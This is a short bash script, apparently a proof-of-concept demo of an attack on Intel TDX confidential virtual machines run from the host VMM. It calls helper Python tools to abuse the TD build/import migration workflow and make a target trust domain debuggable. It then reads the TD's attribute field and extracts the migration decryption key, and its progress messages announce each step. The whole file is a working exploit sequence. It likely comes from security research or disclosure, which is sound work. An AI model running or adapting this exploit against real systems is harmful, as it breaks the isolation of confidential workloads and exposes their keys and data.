#!/bin/bash

clear

DST_TD_NAME="dst_td"
DST_TD_PA=$(python tdxamine.py print_tdr_pa_from_name $DST_TD_NAME)

sleep 1
echo -e "\n[%%] Exploiting TDX build/import workflow to change TD attributes..."
echo "host-vmm: python digby.py $DST_TD_PA immutable.mbmd immutable.data"
python digby.py $DST_TD_PA immutable.mbmd immutable.data

echo -e "\n[+] Target TD is NOW debuggable"

sleep 1
echo -e "\n[%%] Importing destination TD state..."
echo "host-vmm: python tdh_import_state_td.py $DST_TD_PA td.mbmd td.data"
python tdh_import_state_td.py $DST_TD_PA td.mbmd td.data

sleep 1
echo -e "\n[%%] Print destination ATTRIBUTES (0x1 is debug)..."
echo "host-vmm: python tdh_md_rd.py $DST_TD_PA td 0x1110000300000000"
python tdh_md_rd.py $DST_TD_PA td 0x1110000300000000

sleep 1
echo -e "\n[%%] Print migration destination decryption key..."
echo "host-vmm: python tdh_md_rd.py $DST_TD_PA td 0x9810000300000010 --count=4"
python tdh_md_rd.py $DST_TD_PA td 0x9810000300000010 --count=4

echo -e "\n[+] Target TD decryption key extracted."
